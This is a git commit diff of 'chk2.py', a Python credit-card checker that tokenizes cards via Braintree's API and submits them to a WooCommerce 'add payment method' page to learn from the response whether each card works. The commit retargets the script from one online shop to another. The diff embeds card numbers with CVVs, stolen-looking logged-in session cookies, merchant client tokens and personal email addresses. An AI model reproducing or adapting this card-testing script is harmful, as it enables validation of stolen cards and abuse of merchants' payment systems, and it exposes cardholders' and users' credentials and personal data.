52dcb3a9818a1c1d309f45cacd55d825ceb79b08
yousef12102008 <moh552vbnm@gmail.com>
2024-07-23 23:05:23 +0300

    Update chk2.py

--- chk2.py
+++ chk2.py
@@ -50,7 +50,7 @@ def chk(card):
     'authority': 'payments.braintree-api.com',
     'accept': '*/*',
     'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
-    'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MjE3MjU2MDEsImp0aSI6IjcwOTlhM2I0LTkyNmQtNDk4OC04OTc3LTE0ZGMxNjc1MDQxOCIsInN1YiI6ImZzcXd2NWN6cHNyN3ducWMiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6ImZzcXd2NWN6cHNyN3ducWMiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6eyJtZXJjaGFudF9hY2NvdW50X2lkIjoic3R1ZHlub3Rlc2FiYWxsY19pbnN0YW50In19.lqngAPwmg8M1bgSOh1lDuCnREUWQU77a_9-DmOHthq79WMI8OVDgSkXdLbuyDjw1DOc4iavS_95NKCyADd3EEg',
+    'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MjE4NTEyMjAsImp0aSI6IjljMmVjY2NjLWQzZmUtNGM3NC1hYmUzLThiMWMyMGQ3MjJmMyIsInN1YiI6Imt0ZHQzdmI3ZnIzYms5d3oiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6Imt0ZHQzdmI3ZnIzYms5d3oiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0Il0sIm9wdGlvbnMiOnt9fQ.L7AYazjwbT1kEjU_8pncggFLerJBzgWtrMzThD0rYrDYX7weVzi6sonNsbANs128hG9q-fGQCH5SEoRnL1TRdQ',
     'braintree-version': '2018-05-10',
     'cache-control': 'no-cache',
     'content-type': 'application/json',
@@ -70,7 +70,7 @@ def chk(card):
     'clientSdkMetadata': {
         'source': 'client',
         'integration': 'custom',
-        'sessionId': '2643410d-4d21-4f4e-857c-de65c5c4ee68',
+        'sessionId': '55188c7d-396c-429f-895a-6810b7cc478b',
     },
     'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
     'variables': {
@@ -80,10 +80,6 @@ def chk(card):
                 'expirationMonth': mm,
                 'expirationYear': yy,
                 'cvv': cvc,
-                'billingAddress': {
-                    'postalCode': '10080',
-                    'streetAddress': 'hhfhfbfv',
-                },
             },
             'options': {
                 'validate': False,
@@ -97,7 +93,7 @@ def chk(card):
 
 # Note: json_data will not be serialized by requests
 # exactly as it was in the original request.
-#data = '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"2643410d-4d21-4f4e-857c-de65c5c4ee68"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"4610460310238167","expirationMonth":"12","expirationYear":"2028","cvv":"333","billingAddress":{"postalCode":"10080","streetAddress":"hhfhfbfv"}},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}'
+#data = '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"55188c7d-396c-429f-895a-6810b7cc478b"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"5218702766358020","expirationMonth":"02","expirationYear":"2027","cvv":"152"},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}'
 #response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, data=data)
 	tok = response.json()['data']['tokenizeCreditCard']['token']
 	
@@ -117,38 +113,47 @@ def chk(card):
 
 
 
+
+
 	cookies = {
-    'mailchimp_landing_site': 'https%3A%2F%2Fwww.studynotesaba.com%2Fmy-account%2Fadd-payment-method%2F',
-    '_ga': 'GA1.1.998389256.1720402750',
-    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
-    '_fbp': 'fb.1.1720402754229.108781710779578398',
-    'cookielawinfo-checkbox-necessary': 'yes',
-    'CookieLawInfoConsent': 'eyJuZWNlc3NhcnkiOnRydWV9',
-    'viewed_cookie_policy': 'yes',
-    'sbjs_udata': 'vst%3D14%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36',
-    'wordpress_logged_in_76bec00f9541eed79fabb1ee44a35b76': 'hfd044642%7C1722848556%7Ce8YtmFCS0ikpl1f548GT1NLaHwIAb6kzZrlZOmIAJCb%7C33a6d5650d9e6dda435b856a6ae04f3fb98de178106345571380d3c23574be79',
-    'PHPSESSID': 'e469d3b14d1ec53b1998fc3b8fef8838',
+    '_ga': 'GA1.1.1641515761.1720417240',
+    '_gcl_au': '1.1.1296404797.1720417240',
+    '_fbp': 'fb.1.1720417240453.757916464664381020',
+    'omnisend-form-65a6b96077ab435bd118c772-closed-at': '2024-07-08T05:40:53.208Z',
+    'wffn_flt': '2024-7-22 04:03:18',
+    'wffn_timezone': 'Africa/Cairo',
+    'wffn_is_mobile': 'true',
+    'wffn_browser': 'Chrome',
+    'wffn_referrer': '',
+    'wffn_fl_url': '/my-account/',
+    'omnisendContactID': '6691753b55e520dd59ddcd1e',
+    'wordpress_logged_in_13e414371e5f1c2d9a0d5bf21c737d33': 'lyy446333%7C1722852237%7ChzItxZ7CArGipJ5BeouZMesfLO1LkJ96uIbgnTGO99M%7C93bbee58af75b8ed42cbd0a8e1095145634236d9bcd4fd587c34014dc5732234',
+    'wfwaf-authcookie-e3884509b68293414f1439a8c4f61fd5': '44459%7Cother%7Cread%7C9a073e8768c5a96b26599fe7121ed16ee388e26e7d6f4e97a6ae909ec81a0fb9',
+    'soundestID': '20240723195950-i177zrTizNUKQdOHEhuDKNwz3gBuidOfsfcsevWFOIzdxM7Ua',
+    'omnisendSessionID': 'w4VNlgyKpddnYn-20240723195950',
     'sbjs_migrations': '1418474375998%3D1',
+    'sbjs_current_add': 'fd%3D2024-07-23%2019%3A59%3A50%7C%7C%7Cep%3Dhttps%3A%2F%2Fefxsports.com%2Fmy-account%2F%7C%7C%7Crf%3D%28none%29',
+    'sbjs_first_add': 'fd%3D2024-07-23%2019%3A59%3A50%7C%7C%7Cep%3Dhttps%3A%2F%2Fefxsports.com%2Fmy-account%2F%7C%7C%7Crf%3D%28none%29',
+    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
     'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
-    'mailchimp.cart.previous_email': 'hfd044642@gmail.com',
-    'mailchimp.cart.current_email': 'moh5527vbnm@gmail.com',
-    'mailchimp_user_previous_email': 'moh5527vbnm%40gmail.com',
-    'mailchimp_user_email': 'moh5527vbnm%40gmail.com',
-    '_ga_SGEGXEGQDY': 'GS1.1.1721638931.14.1.1721639202.60.0.0',
-    '_ga_WNQMQBX793': 'GS1.1.1721638932.14.1.1721639204.58.0.0',
-    'sbjs_session': 'pgs%3D12%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.studynotesaba.com%2Fmy-account%2Fadd-payment-method%2F',
+    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36',
+    'fkcart_cart_qty': '0',
+    'fkcart_cart_total': '%3Cspan%20class%3D%22woocommerce-Price-amount%20amount%22%3E%3Cbdi%3E%3Cspan%20class%3D%22woocommerce-Price-currencySymbol%22%3E%26%2336%3B%3C%2Fspan%3E0.00%3C%2Fbdi%3E%3C%2Fspan%3E',
+    'sbjs_session': 'pgs%3D3%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fefxsports.com%2Fmy-account%2Fadd-payment-method%2F',
+    'page-views': '3',
+    '_ga_CYYECGMPHQ': 'GS1.1.1721764792.6.1.1721764851.1.0.0',
 }
 
 	headers = {
-    'authority': 'www.studynotesaba.com',
+    'authority': 'efxsports.com',
     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
     'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
     'cache-control': 'no-cache',
     'content-type': 'application/x-www-form-urlencoded',
-    # 'cookie': 'mailchimp_landing_site=https%3A%2F%2Fwww.studynotesaba.com%2Fmy-account%2Fadd-payment-method%2F; _ga=GA1.1.998389256.1720402750; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; _fbp=fb.1.1720402754229.108781710779578398; cookielawinfo-checkbox-necessary=yes; CookieLawInfoConsent=eyJuZWNlc3NhcnkiOnRydWV9; viewed_cookie_policy=yes; sbjs_udata=vst%3D14%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36; wordpress_logged_in_76bec00f9541eed79fabb1ee44a35b76=hfd044642%7C1722848556%7Ce8YtmFCS0ikpl1f548GT1NLaHwIAb6kzZrlZOmIAJCb%7C33a6d5650d9e6dda435b856a6ae04f3fb98de178106345571380d3c23574be79; PHPSESSID=e469d3b14d1ec53b1998fc3b8fef8838; sbjs_migrations=1418474375998%3D1; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; mailchimp.cart.previous_email=hfd044642@gmail.com; mailchimp.cart.current_email=moh5527vbnm@gmail.com; mailchimp_user_previous_email=moh5527vbnm%40gmail.com; mailchimp_user_email=moh5527vbnm%40gmail.com; _ga_SGEGXEGQDY=GS1.1.1721638931.14.1.1721639202.60.0.0; _ga_WNQMQBX793=GS1.1.1721638932.14.1.1721639204.58.0.0; sbjs_session=pgs%3D12%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.studynotesaba.com%2Fmy-account%2Fadd-payment-method%2F',
-    'origin': 'https://www.studynotesaba.com',
+    # 'cookie': '_ga=GA1.1.1641515761.1720417240; _gcl_au=1.1.1296404797.1720417240; _fbp=fb.1.1720417240453.757916464664381020; omnisend-form-65a6b96077ab435bd118c772-closed-at=2024-07-08T05:40:53.208Z; wffn_flt=2024-7-22 04:03:18; wffn_timezone=Africa/Cairo; wffn_is_mobile=true; wffn_browser=Chrome; wffn_referrer=; wffn_fl_url=/my-account/; omnisendContactID=6691753b55e520dd59ddcd1e; wordpress_logged_in_13e414371e5f1c2d9a0d5bf21c737d33=lyy446333%7C1722852237%7ChzItxZ7CArGipJ5BeouZMesfLO1LkJ96uIbgnTGO99M%7C93bbee58af75b8ed42cbd0a8e1095145634236d9bcd4fd587c34014dc5732234; wfwaf-authcookie-e3884509b68293414f1439a8c4f61fd5=44459%7Cother%7Cread%7C9a073e8768c5a96b26599fe7121ed16ee388e26e7d6f4e97a6ae909ec81a0fb9; soundestID=20240723195950-i177zrTizNUKQdOHEhuDKNwz3gBuidOfsfcsevWFOIzdxM7Ua; omnisendSessionID=w4VNlgyKpddnYn-20240723195950; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-07-23%2019%3A59%3A50%7C%7C%7Cep%3Dhttps%3A%2F%2Fefxsports.com%2Fmy-account%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-07-23%2019%3A59%3A50%7C%7C%7Cep%3Dhttps%3A%2F%2Fefxsports.com%2Fmy-account%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36; fkcart_cart_qty=0; fkcart_cart_total=%3Cspan%20class%3D%22woocommerce-Price-amount%20amount%22%3E%3Cbdi%3E%3Cspan%20class%3D%22woocommerce-Price-currencySymbol%22%3E%26%2336%3B%3C%2Fspan%3E0.00%3C%2Fbdi%3E%3C%2Fspan%3E; sbjs_session=pgs%3D3%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fefxsports.com%2Fmy-account%2Fadd-payment-method%2F; page-views=3; _ga_CYYECGMPHQ=GS1.1.1721764792.6.1.1721764851.1.0.0',
+    'origin': 'https://efxsports.com',
     'pragma': 'no-cache',
-    'referer': 'https://www.studynotesaba.com/my-account/add-payment-method/',
+    'referer': 'https://efxsports.com/my-account/add-payment-method/',
     'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
     'sec-ch-ua-mobile': '?1',
     'sec-ch-ua-platform': '"Android"',
@@ -160,23 +165,28 @@ def chk(card):
     'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
 }
 
-	data = {
-    'payment_method': 'braintree_cc',
-    'braintree_cc_nonce_key': tok,
-    'braintree_cc_device_data': '{"device_session_id":"427224c452d030373bf18dc484f2ba51","fraud_merchant_id":null,"correlation_id":"228ac6955a8991820819453f6eb12f9e"}',
-    'braintree_cc_3ds_nonce_key': '',
-    'braintree_cc_config_data': '{"environment":"production","clientApiUrl":"https://api.braintreegateway.com:443/merchants/fsqwv5czpsr7wnqc/client_api","assetsUrl":"https://assets.braintreegateway.com","analytics":{"url":"https://client-analytics.braintreegateway.com/fsqwv5czpsr7wnqc"},"merchantId":"fsqwv5czpsr7wnqc","venmo":"off","graphQL":{"url":"https://payments.braintree-api.com/graphql","features":["tokenize_credit_cards"]},"applePayWeb":{"countryCode":"US","currencyCode":"USD","merchantIdentifier":"fsqwv5czpsr7wnqc","supportedNetworks":["visa","mastercard","amex","discover"]},"kount":{"kountMerchantId":null},"challenges":["cvv"],"creditCards":{"supportedCardTypes":["MasterCard","Visa","Discover","JCB","American Express","UnionPay"]},"threeDSecureEnabled":false,"threeDSecure":null,"androidPay":{"displayName":"Study Notes ABA LLC","enabled":true,"environment":"production","googleAuthorizationFingerprint":"eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MjE3MjUzNjQsImp0aSI6IjcxMjMxMTUxLWIwYmQtNGU2NC1hOGIyLWU0MDYxZTE3ZTA2MSIsInN1YiI6ImZzcXd2NWN6cHNyN3ducWMiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6ImZzcXd2NWN6cHNyN3ducWMiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbInRva2VuaXplX2FuZHJvaWRfcGF5IiwibWFuYWdlX3ZhdWx0Il0sInNjb3BlIjpbIkJyYWludHJlZTpWYXVsdCJdLCJvcHRpb25zIjp7fX0.RR18SF1__8o2oNEdjg2RaoTt6B1VJZHPZ2MCabB2HL879aIb2rWqIr2HagE5HyXQdde8EP4O_9zYpFjwa8OHFw","paypalClientId":"AdK9MKiret3zcVK9VufGNTD9wp47RxRz4Cx_YlrHe0beIfHzkHbwy3naaP0NrI7ZJ-ZNQ7s7c1eEIsbY","supportedNetworks":["visa","mastercard","amex","discover"]},"paypalEnabled":true,"paypal":{"displayName":"Study Notes ABA LLC","clientId":"AdK9MKiret3zcVK9VufGNTD9wp47RxRz4Cx_YlrHe0beIfHzkHbwy3naaP0NrI7ZJ-ZNQ7s7c1eEIsbY","assetsUrl":"https://checkout.paypal.com","environment":"live","environmentNoNetwork":false,"unvettedMerchant":false,"braintreeClientId":"ARKrYRDh3AGXDzW7sO_3bSkq-U1C7HG_uWNC-z57LjYSDNUOSaOtIa9q6VpW","billingAgreementsEnabled":true,"merchantAccountId":"studynotesaballc_instant","payeeEmail":null,"currencyIsoCode":"USD"}}',
-    'woocommerce-add-payment-method-nonce': '8af3d4763b',
-    '_wp_http_referer': '/my-account/add-payment-method/',
-    'woocommerce_add_payment_method': '1',
-}
+	data = [
+    ('payment_method', 'braintree_credit_card'),
+    ('wc-braintree-credit-card-card-type', 'master-card'),
+    ('wc-braintree-credit-card-3d-secure-enabled', ''),
+    ('wc-braintree-credit-card-3d-secure-verified', ''),
+    ('wc-braintree-credit-card-3d-secure-order-total', '0.00'),
+    ('wc_braintree_credit_card_payment_nonce', tok,),
+    ('wc_braintree_device_data', '{"correlation_id":"baded12ecfdec4e07b1edb5641a5aa46"}'),
+    ('wc-braintree-credit-card-tokenize-payment-method', 'true'),
+    ('wc_braintree_paypal_payment_nonce', ''),
+    ('wc_braintree_device_data', '{"correlation_id":"baded12ecfdec4e07b1edb5641a5aa46"}'),
+    ('wc-braintree-paypal-context', 'shortcode'),
+    ('wc_braintree_paypal_amount', '0.00'),
+    ('wc_braintree_paypal_currency', 'USD'),
+    ('wc_braintree_paypal_locale', 'en_us'),
+    ('wc-braintree-paypal-tokenize-payment-method', 'true'),
+    ('woocommerce-add-payment-method-nonce', 'e01273f141'),
+    ('_wp_http_referer', '/my-account/add-payment-method/'),
+    ('woocommerce_add_payment_method', '1'),
+]
 
-	response = requests.post(
-    'https://www.studynotesaba.com/my-account/add-payment-method/',
-    cookies=cookies,
-    headers=headers,
-    data=data,
-)
+	response = requests.post('https://efxsports.com/my-account/add-payment-method/', cookies=cookies, headers=headers, data=data)
 	text = response.text
 	
 	pattern = r'Reason: (.*?)\s*</li>'
